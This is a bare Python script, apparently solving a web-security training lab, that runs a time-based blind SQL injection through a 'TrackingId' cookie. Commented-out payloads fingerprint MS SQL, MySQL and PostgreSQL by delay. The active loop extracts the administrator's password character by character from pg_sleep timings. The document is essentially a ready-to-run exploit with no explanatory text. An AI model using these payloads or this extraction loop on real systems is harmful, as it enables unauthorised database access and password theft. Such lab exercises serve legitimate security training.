import requests
from time import time

url = "https://0a62008603baad4d810d5d0a00c000d7.web-security-academy.net/"
"""
start = time()
tracking_cookie = f"x'%3BIF+(1=1)+WAITFOR+DELAY+'0:0:10'--"
response = session.get(
	url,
	cookies={'TrackingId':tracking_cookie})
print(f"Microsoft SQL Server : Received in {time() - start}")

start = time()
tracking_cookie = f"x'%3BSELECT+IF(1=1,SLEEP(10),'a')--"
response = session.get(
	url,
	cookies={'TrackingId':tracking_cookie})
print(f"MySQL : Received in {time() - start}")

start = time()
tracking_cookie = f"x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--"
response = session.get(
	url,
	cookies={'TrackingId':tracking_cookie})
print(f"PostgreSQL : Received in {time() - start}")
"""

BDD = "PostreSQL"

password = ''
vals = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', ' ']
counter = 1
while(True):
	print(f"Looking for char #{counter}")
	for i in vals:
		session = requests.Session()
		
		tracking_cookie = f"x'%3BSELECT+CASE+WHEN+(SUBSTR((select+password+from+users+where+username='administrator'),{counter},1)='{i}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--"
		#print(tracking_cookie)
		start = time()
		response = session.get(
			url,
			cookies={'TrackingId':tracking_cookie})
		end = time()
		if((end - start) > 5):
			password += i
			counter += 1
			break
	print(password)	
